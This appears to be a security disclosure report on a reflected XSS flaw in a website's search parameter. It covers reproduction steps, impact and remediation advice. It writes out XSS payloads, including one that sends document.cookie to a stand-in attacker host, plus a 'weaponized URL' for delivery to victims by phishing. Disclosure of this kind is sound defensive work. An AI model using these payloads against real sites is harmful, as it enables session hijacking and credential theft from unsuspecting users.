## Title
Unauthenticated Reflected XSS in Search Functionality Allows Arbitrary JavaScript Execution

## OWASP - Vulnerability
OWASP Top 10 2025 - A05 Injection

## Summary
An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists in the website's search functionality, allowing attackers to execute arbitrary JavaScript in a victim's browser. When a user visits a specially crafted URL containing malicious script in the search query, the server immediately reflects that input back into the HTTP response without proper sanitization or context-aware output encoding.

## Vulnerable Endpoint
`https://guidelines.pwnedbox.site/index.php?s=`

## Payload Used
```
  cybrnoob'"<><script>alert(document.location)</script>
  cybrnoob'"<><script>cosole.error(document.location)</script>
  cybrnoob'"<><script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>
```

## Steps to Reproduce
1. Interact with the search box and observe whether the input `cybrnoob'"<>` is reflected in the source.
    <img width="1512" height="982" alt="SCR-20261119-miho" src="https://github.com/user-attachments/assets/db539897-139d-465b-a1ca-21db05096077" />
2. Inject javascript in the search box to verify if it is executed.
  - Note: `alert(), confirm(), prompt(), console.log(), console.error(), fetch()` all generate valid responses.
     - Here it can be seen that the injected payload executes seamlessly.
  <img width="1512" height="982" alt="SCR-20261119-nyms" src="https://github.com/user-attachments/assets/1114d256-81e2-4c95-b510-c13597dcf06b" />
  <img width="1512" height="982" alt="SCR-20261119-nyiq" src="https://github.com/user-attachments/assets/eaf5184f-7add-4e1b-ac2e-02c75e66df6a" />
  <img width="1512" height="982" alt="SCR-20261119-nzfb" src="https://github.com/user-attachments/assets/38790fcc-85f2-4fe4-9216-56095736ade7" />
3. Craft a weaponized URL (e.g., `https://guidelines.pwnedbox.site/index.php?s=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.

## Impact / Risk
1. An attacker can steal session cookies and impersonate the victim.
2. Malicious script can display fake login forms and steal credentials.
3. The script can redirect users, alter page content, or perform actions on their behalf.

## Recommendation
1. Never trust any user input. Treat the q parameter as untrusted regardless of its source.
2. Sanitize the search input and reject or strip HTML special characters such as <, >, ", ', and &.
3. Apply context-aware HTML encoding on output so reflected input is rendered as text and never as executable markup.
4. Use a vetted encoding library and add a restrictive Content Security Policy with HttpOnly and SameSite cookies as defense in depth.
